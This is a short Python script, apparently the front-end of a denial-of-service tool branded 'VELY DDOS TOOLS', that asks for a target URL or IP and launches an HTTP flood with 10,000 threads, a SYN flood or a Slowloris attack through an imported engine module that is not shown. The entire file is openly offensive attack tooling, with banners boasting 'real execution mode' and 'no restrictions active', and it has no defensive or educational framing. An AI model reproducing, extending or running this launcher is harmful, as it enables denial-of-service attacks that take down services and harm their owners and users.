#!/usr/bin/env python3
# VELY DDOS LAUNCHER - OWNER: GXYENN 正式

from core_engine import VelyDDoS
import sys

print("""
╔══════════════════════════════════════╗
║      VELY DDOS TOOLS - GXYENN        ║
║         REAL EXECUTION MODE          ║
╚══════════════════════════════════════╝
""")

target = input("[+] Target URL/IP: ")
method = input("[+] Method (http/syn/slowloris): ")

vely = VelyDDoS()

if method == "http":
    vely.http_flood(target, threads=10000)
elif method == "syn":
    vely.syn_flood(target)
elif method == "slowloris":
    vely.slowloris(target)

print("[!] Attack launched - No restrictions active")
print("[!] Press Ctrl+C to stop (not recommended)")